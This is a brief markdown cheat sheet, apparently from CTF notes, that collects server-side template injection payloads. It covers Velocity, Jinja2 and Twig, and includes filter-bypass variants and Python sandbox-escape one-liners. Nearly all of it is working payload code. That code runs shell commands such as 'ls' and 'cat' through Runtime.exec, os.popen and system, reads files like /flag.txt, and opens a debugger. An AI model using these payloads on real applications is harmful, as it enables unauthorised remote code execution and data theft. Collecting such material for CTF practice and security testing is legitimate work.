#### Velocity template Langauge payload:

```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```

#### Jinja payload <i>(Python)</i> : 

```py
#normal payload
 {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}

#payload without _\.
{%set c='%c%c'|format(95,95)%}{{dict|attr('mro')()|attr(c~'getitem'~c)(1)|attr(c~'subclasses'~c)()|attr(c~'getitem'~c)(221)|attr(c~'init'~c)|attr(c~'globals'~c)|attr(c~'getitem'~c)('sys')|attr('modules')|attr(c~'getitem'~c)('os')|attr('popen')('ls')|attr('read')()}}

#shortcuts
 {{ url_for.__globals__.os.popen("ls").read() }}
 {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}


#find catch_warning index automatically
{{ ("foo".__class__.__base__.__subclasses__()|selectattr("__name__","equalto","catch_warnings")|first).__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
#find atch_warning auto in pure python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]

# those were for pyjails with some checks
1 and {}.__class__.__mro__[1].__subclasses__()[203].__init__.__globals__['sys'].modules['so'[::-1]].𝓼𝔂𝓼𝓽𝓮𝓶('cat *')
0+(a:=().__class__.__base__.__subclasses__()[151].__len__.__globals__["__b"+"uiltins__"],a["print"](a["op""en"]("/app/run").read()))
0+().__class__.__base__.__subclasses__()[158]().__call__.__buil𝘵ins__[_:=\"__impor\\x74__\"](\"pdb\").set_trace()  # print source code
 ```

### Twig

```py
{{['cat${IFS}/flag.txt']|filter('system')}}
```

![image](https://github.com/user-attachments/assets/d812c5f3-2f59-476a-a1e8-6a7ae978695a)

